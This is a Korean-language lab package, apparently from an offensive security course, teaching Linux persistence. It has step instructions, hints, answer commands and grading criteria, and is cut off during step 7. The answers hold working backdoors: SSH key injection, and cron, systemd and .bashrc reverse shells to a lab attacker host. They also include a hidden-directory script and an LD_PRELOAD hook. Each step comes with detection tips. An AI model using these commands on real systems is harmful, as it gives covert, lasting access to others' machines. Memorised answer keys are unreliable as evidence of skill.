lab_id: attack-nonai-week09
title: 지속성 확보 (Persistence)
version: non-ai
course: attack-nonai
week: 9
description: 시스템 접근을 유지하기 위한 지속성(Persistence) 기법을 실습한다. 백도어 설치, SSH 키 주입, cron 악용,
  systemd 서비스 등록 등 다양한 방법으로 재접근 경로를 확보한다.
difficulty: medium
duration_minutes: 120
objectives:
- MITRE ATT&CK Persistence 전술의 주요 기법을 이해한다
- SSH 키 기반 백도어, cron 기반 지속성을 설정할 수 있다
- 지속성 기법의 탐지 방법과 제거 방법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 공격자 머신에서 SSH 키 쌍을 생성하고, web 서버({{WEB_IP}})의 authorized_keys에 공개키를 추가하여
    비밀번호 없이 접속할 수 있게 하라.
  hint: |
    ssh-keygen으로 키를 생성하고 ssh-copy-id 또는 수동으로 공개키를 추가한다.

    📎 도구 우선순위 (힌트):
    1) 우선: ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '' -q && cat /tmp/backdoor_key.pub | ssh ccc@10.20.30.80 'cat >> ~/.ssh/authorized_keys'
    2) 미설치: sudo apt install -y openssh-client
    3) 실패/대안:
       - ssh-copy-id -i /tmp/backdoor_key.pub user@host
       - ansible authorized_key 모듈
       - Metasploit sshkey_persistence
       - ssh-keygen -t rsa -b 4096
       - puttygen -t ed25519
       - SSH agent forwarding 악용
       - certs OpenSSH (ssh-keygen -s)
    4) 검증: T1098.004 SSH Authorized Keys.
  category: exploit
  points: 10
  answer: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && ssh ccc@10.20.30.80
    ''mkdir -p ~/.ssh && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub
    | ssh ccc@10.20.30.80 ''cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys''
    2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no ccc@10.20.30.80
    ''echo SSH key backdoor successful: $(whoami)'' 2>/dev/null'
  answer_detail: SSH 키 기반 백도어는 가장 은밀한 지속성 기법 중 하나이다. authorized_keys에 공격자의 공개키를 추가하면
    비밀번호 변경과 무관하게 접속이 가능하다. 탐지를 위해 authorized_keys를 정기적으로 감사해야 한다.
  verify:
    type: output_contains
    expect: backdoor successful
    field: stdout
    semantic:
      intent: SSH 키 백도어 — ssh-keygen -t ed25519 -f /tmp/backdoor_key + cat pub | ssh
        'cat >> ~/.ssh/authorized_keys' + ssh -i /tmp/backdoor_key. 비밀번호 변경 무관 접속.
        MITRE ATT&CK T1098.004.
      success_criteria:
      - backdoor successful 키워드
      - ssh-keygen + authorized_keys 추가
      - 키 인증 로그인
      acceptable_methods:
      - "ssh-keygen + ssh-copy-id (수기 baseline)."
      - "수동 authorized_keys cat >> 추가."
      - "Metasploit sshkey_persistence."
      - "ansible authorized_key 모듈."
      - "puttygen -t ed25519."
      - "OpenSSH certs (ssh-keygen -s)."
      - "SSH agent forwarding 악용."
      - "Bastion AI 지속성 orchestrator."
      negative_signs:
      - authorized_keys 없음
      - T1098.004 맥락 없음
  target_vm: attacker
- order: 2
  instruction: web 서버에 cron 기반 리버스 셸 백도어를 설정하라. 매 5분마다 공격자에게 연결을 시도하는 cronjob을 작성하라(실제
    실행은 하지 않고 crontab 형식만 작성).
  hint: |
    crontab -e로 편집하거나 echo로 crontab 형식을 출력한다.

    📎 도구 우선순위 (힌트):
    1) 우선: echo '*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/10.20.30.201/4444 0>&1" 2>/dev/null' > /tmp/cron_backdoor.txt && cat /tmp/cron_backdoor.txt
    2) 미설치: 기본 cron
    3) 실패/대안:
       - crontab -e (대화형)
       - /etc/cron.d/ + write 파일 직접 추가
       - /var/spool/cron/crontabs/$USER
       - systemd timer + service unit
       - at 명령 (단발)
       - inotify-tools watch + 트리거
       - bash sleep loop daemon
    4) 검증: T1053.003 Cron + payload only (실 실행 X).
  category: exploit
  points: 10
  answer: echo '# Cron-based reverse shell persistence' && echo '*/5 * * * * /bin/bash
    -c "bash -i >& /dev/tcp/10.20.30.201/4444 0>&1" 2>/dev/null' > /tmp/cron_backdoor.txt
    && echo 'Cron backdoor payload:' && cat /tmp/cron_backdoor.txt
  answer_detail: 'cron 기반 백도어는 설정된 간격으로 반복 실행된다. 공격자의 리스너가 다운되어도 다음 실행 시점에 다시 연결된다.
    탐지: crontab -l로 모든 사용자의 cron을 정기 검사한다.'
  verify:
    type: output_contains
    expect: Cron backdoor payload
    field: stdout
    semantic:
      intent: cron 리버스 셸 — */5 * * * * bash -i >& /dev/tcp/10.20.30.201/4444 0>&1.
        5분 주기 연결. 리스너 다운 시 재연결. MITRE ATT&CK T1053.003 Cron.
      success_criteria:
      - Cron backdoor payload 키워드
      - '*/5 * * * * + /dev/tcp 리버스 셸'
      - crontab 형식
      acceptable_methods:
      - "echo crontab 형식 + payload (수기 baseline)."
      - "crontab -e (대화형)."
      - "/etc/cron.d/ 파일 직접."
      - "/var/spool/cron/crontabs/$USER."
      - "systemd timer + service unit."
      - "at 명령 (단발)."
      - "inotify-tools watch + 트리거."
      - "bash sleep loop daemon."
      negative_signs:
      - cron 형식 없음
      - T1053.003 맥락 없음
  target_vm: attacker
- order: 3
  instruction: systemd 서비스 파일을 작성하여 시스템 부팅 시 자동으로 리버스 셸을 실행하는 백도어를 만들어라(파일 생성만, 설치는
    하지 않음).
  hint: |
    /etc/systemd/system/에 .service 파일을 작성한다.

    📎 도구 우선순위 (힌트):
    1) 우선: cat > /tmp/backdoor.service << 'EOF' [Unit]/[Service]/[Install] EOF (파일 생성만)
    2) 미설치: 기본 systemd
    3) 실패/대안:
       - systemctl edit --full <service> (기존 변조)
       - /etc/systemd/system/multi-user.target.wants/
       - ~/.config/systemd/user/ (사용자 단위)
       - systemd timer (.timer + .service)
       - sysv init.d /etc/init.d/<script>
       - rc.local 추가 (legacy)
       - upstart .conf (구식 Ubuntu)
       - initramfs hook (부팅 직후)
    4) 검증: T1543.002 Systemd Service. 파일 생성만.
  category: exploit
  points: 10
  answer: 'cat > /tmp/backdoor.service << ''EOF''

    [Unit]

    Description=System Update Service

    After=network.target


    [Service]

    Type=simple

    ExecStart=/bin/bash -c ''bash -i >& /dev/tcp/10.20.30.201/4444 0>&1''

    Restart=always

    RestartSec=60


    [Install]

    WantedBy=multi-user.target

    EOF

    echo ''Systemd backdoor service file:'' && cat /tmp/backdoor.service'
  answer_detail: 'systemd 서비스 백도어는 시스템 부팅 시 자동 시작되며, Restart=always로 설정하면 종료되어도 자동
    재시작된다. 합법적인 서비스명으로 위장하면 발견이 어렵다. 탐지: systemctl list-unit-files에서 비정상 서비스를 검사한다.'
  verify:
    type: output_contains
    expect:
    - Systemd backdoor
    - service
    field: stdout
    semantic:
      intent: 'systemd 서비스 백도어 — cat > /tmp/backdoor.service: [Service] ExecStart=bash
        -i >& /dev/tcp + Restart=always + RestartSec=60 + WantedBy=multi-user.target.
        부팅 자동 실행 + 종료 시 재시작. MITRE ATT&CK T1543.002.'
      success_criteria:
      - Systemd backdoor 키워드
      - .service 파일 + [Service] 섹션
      - Restart=always
      acceptable_methods:
      - "cat > .service [Unit][Service][Install] (수기 baseline)."
      - "systemctl edit --full <service> 변조."
      - "/etc/systemd/system/multi-user.target.wants/."
      - "~/.config/systemd/user/ (사용자 단위)."
      - "systemd timer (.timer + .service)."
      - "sysv init.d / rc.local."
      - "upstart .conf / initramfs hook."
      - "Metasploit service persistence."
      negative_signs:
      - .service 없음
      - Restart=always 없음
      - T1543.002 맥락 없음
  target_vm: attacker
- order: 4
  instruction: .bashrc에 백도어 명령을 삽입하여 사용자가 로그인할 때마다 리버스 셸을 실행하도록 하라(시뮬레이션만).
  hint: |
    .bashrc에 명령을 추가하면 셸 시작 시 자동 실행된다.

    📎 도구 우선순위 (힌트):
    1) 우선: echo '# Backdoor (simulation): bash -i >& /dev/tcp/IP/4444 0>&1' (출력만)
    2) 미설치: 기본 bash
    3) 실패/대안:
       - .bash_profile 추가
       - .bash_login / .profile 추가
       - /etc/bash.bashrc (시스템 전역)
       - /etc/profile.d/<script>.sh
       - .zshrc / .zlogin (zsh)
       - .vimrc (vim 시작 시)
       - PROMPT_COMMAND env 변수
       - SHELL alias 변조
    4) 검증: T1546.004 Unix Shell Configuration Modification.
  category: exploit
  points: 10
  answer: echo '# .bashrc persistence payload (simulation only)' && echo 'echo "nohup
    bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 &" >> ~/.bashrc' > /tmp/bashrc_backdoor.txt
    && echo 'Payload:' && cat /tmp/bashrc_backdoor.txt
  answer_detail: '.bashrc/.profile 백도어는 사용자가 셸을 열 때마다 실행된다. nohup과 &로 백그라운드 실행하면 사용자는
    눈치채지 못한다. 탐지: .bashrc/.profile의 변경 이력을 FIM(File Integrity Monitoring)으로 감시한다.'
  verify:
    type: output_contains
    expect: 'Payload:'
    field: stdout
    semantic:
      intent: .bashrc 백도어 — echo 'nohup bash -i >& /dev/tcp/10.20.30.201/4444 0>&1
        &' >> ~/.bashrc. 사용자 셸 시작 시 매번 실행. nohup+백그라운드로 사용자 인지 회피. MITRE ATT&CK T1546.004.
      success_criteria:
      - 'Payload: 키워드'
      - .bashrc 추가 페이로드
      - T1546.004 맥락
      acceptable_methods:
      - "echo .bashrc payload (수기 baseline, 출력만)."
      - ".bash_profile / .bash_login / .profile."
      - "/etc/bash.bashrc (시스템 전역)."
      - "/etc/profile.d/<script>.sh."
      - ".zshrc / .zlogin (zsh)."
      - ".vimrc (vim 시작)."
      - "PROMPT_COMMAND env."
      - "alias 변조 / function override."
      negative_signs:
      - .bashrc/.profile 없음
      - T1546.004 맥락 없음
  target_vm: attacker
- order: 5
  instruction: web 서버에서 /tmp에 숨겨진 디렉토리를 생성하고 백도어 스크립트를 배치하라.
  hint: |
    점(.)으로 시작하는 디렉토리는 ls에 표시되지 않는다.

    📎 도구 우선순위 (힌트):
    1) 우선: ssh ccc@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo ... && chmod +x ...' 2>/dev/null
    2) 미설치: 기본 coreutils
    3) 실패/대안:
       - /dev/shm/.hidden (tmpfs, 메모리)
       - /var/tmp/. (재부팅 후 유지)
       - ~/.config/.<hidden>
       - /usr/share/doc/ (정상 디렉토리 위장)
       - chattr +i (immutable, root 시)
       - extattr 메타데이터 숨김
       - mount --bind 위장
       - 파일명 NULL/유니코드 트릭
    4) 검증: T1564.001 Hidden Files and Directories.
  category: exploit
  points: 10
  answer: ssh ccc@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash"
    ※ /tmp/.hidden_backdoor/update.sh && echo "# Simulated backdoor script" >> /tmp/.hidden_backdoor/update.sh
    && chmod +x /tmp/.hidden_backdoor/update.sh && ls -la /tmp/.hidden_backdoor/'
    2>/dev/null
  answer_detail: '숨겨진 디렉토리(.으로 시작)에 백도어를 배치하면 일반적인 ls 명령으로는 발견되지 않는다. /tmp, /dev/shm,
    /var/tmp 등 tmpfs 디렉토리가 자주 사용된다. 탐지: find로 숨겨진 파일/디렉토리를 정기 검색한다.'
  verify:
    type: output_contains
    expect: update.sh
    field: stdout
    semantic:
      intent: 숨겨진 디렉토리 백도어 — ssh + mkdir -p /tmp/.hidden_backdoor + echo '#!/bin/bash'
        > update.sh + chmod +x. 점(.)으로 시작하는 디렉토리 = 기본 ls 미표시. tmpfs (/tmp, /dev/shm,
        /var/tmp) 자주 사용. find로 탐지.
      success_criteria:
      - update.sh 키워드
      - /tmp/.hidden_backdoor mkdir + 스크립트 생성
      - chmod +x
      acceptable_methods:
      - "mkdir /tmp/.hidden_backdoor + 스크립트 (수기 baseline)."
      - "/dev/shm/.hidden (tmpfs)."
      - "/var/tmp/. (재부팅 유지)."
      - "~/.config/.<hidden>."
      - "/usr/share/doc/ 위장."
      - "chattr +i immutable."
      - "extattr 메타데이터."
      - "mount --bind 위장."
      negative_signs:
      - .으로 시작하는 숨김 디렉토리 맥락 없음
      - tmpfs 맥락 없음
  target_vm: attacker
- order: 6
  instruction: PAM(Pluggable Authentication Module) 백도어의 원리를 이해하기 위해 web 서버의 PAM 설정
    파일을 확인하라.
  hint: |
    /etc/pam.d/ 디렉토리의 설정 파일을 확인한다.

    📎 도구 우선순위 (힌트):
    1) 우선: ssh ccc@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth' 2>/dev/null | head -30
    2) 미설치: 기본 PAM (libpam-modules)
    3) 실패/대안:
       - ls -la /etc/pam.d/
       - debsums -c (Debian 무결성 검사)
       - rpm -V pam (RHEL)
       - sha256sum /lib/x86_64-linux-gnu/security/pam_unix.so
       - aide / Tripwire 무결성 모니터
       - osquery file_events
       - linux-pam manuals (man pam.d)
    4) 검증: T1556.003 Modify Authentication Process - PAM.
  category: analysis
  points: 10
  answer: ssh ccc@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth
    2>/dev/null' 2>/dev/null | head -30
  answer_detail: PAM 백도어는 인증 모듈을 조작하여 특정 비밀번호로 모든 계정에 로그인할 수 있게 한다. pam_unix.so를 수정하거나
    커스텀 PAM 모듈을 삽입하는 방식이다. 매우 은밀하지만 패키지 무결성 검사(debsums)로 탐지할 수 있다.
  verify:
    type: output_contains
    expect: pam
    field: stdout
    semantic:
      intent: PAM 백도어 분석 — ssh + cat /etc/pam.d/sshd + /etc/pam.d/common-auth. PAM
        인증 모듈 조작 → pam_unix.so 수정 or 커스텀 모듈 삽입으로 마스터 패스워드 주입. debsums/rpm -V로 탐지.
      success_criteria:
      - pam 키워드
      - /etc/pam.d/sshd + common-auth 조회
      - PAM 설정 분석
      acceptable_methods:
      - "cat /etc/pam.d/sshd + common-auth (수기 baseline)."
      - "ls -la /etc/pam.d/."
      - "debsums -c (Debian 무결성)."
      - "rpm -V pam (RHEL)."
      - "sha256sum pam_unix.so."
      - "aide / Tripwire."
      - "osquery file_events."
      - "linux-pam manuals."
      negative_signs:
      - /etc/pam.d 없음
      - pam_unix.so/커스텀 모듈 맥락 없음
  target_vm: attacker
- order: 7
  instruction: LD_PRELOAD 백도어의 원리를 이해하기 위해, 간단한 공유 라이브러리를 작성하고 LD_PRELOAD로 함수를 후킹하는
    예제를 만들어라.
  hint: |
    C 코드로 라이브러리를 작성하고 gcc -shared -fPIC로 컴파일한다.

    📎 도구 우선순위 (힌트):
    1) 우선: echo '#include...__attribute__((constructor)) void init(){...}' > /tmp/hook.c && gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c && LD_PRELOAD=/tmp/hook.so id
    2) 미설치: sudo apt install -y gcc
    3) 실패/대안:
       - /etc/ld.so.preload (시스템 전역)
       - rust cdylib + #[ctor]
       - python ctypes.CDLL hook
       - LD_AUDIT (audit interface)
       - libc symbol replacement (dlsym)
       - PRELOAD via setarch wrapper
       - frida-server (런타임 후킹)
       - eBPF kprobe/uprobe
    4) 검증: T1574.006 Hijack Execution Flow - LD_PRELOAD.
  category: exploit
  points: 10
  answer: "echo '#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor))\
    \ void init() {\n    printf(\"[LD_PRELOAD hook executed] PID=%d\\n\", getpid());\n\
    }' > /tmp/hook.c && gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c 2>/dev/null\
    \ && LD_PRELOAD=/tmp/hook.so id 2>/dev/null"
  answer_detail: 'LD_PRELOAD 백도어는 공유 라이브러리를 프로세스 시작 시 먼저 로딩하여 시스템 함수를 후킹한다. /etc/ld.so.preload에
    등록하면 모든 프로세스에 적용된다. 탐지: /etc/ld.so.preload 파일 감시, ldd로 라이브러리 확인.'
  verify:
    type: output_contains
    expect: LD_PRELOAD hook
    field: stdout
    semantic:
      intent: LD_PRELOAD 후킹 — C 코드 __attribute__((constructor)) init() printf hook
        + gcc -shared -fPIC -o hook.so + LD_PRELOAD=hook.so id. 프로세스 시작 시 먼저 로드되는
        공유 라이브러리. /etc/ld.so.preload 등록 시 모든 프로세스 적용.
      success_criteria:
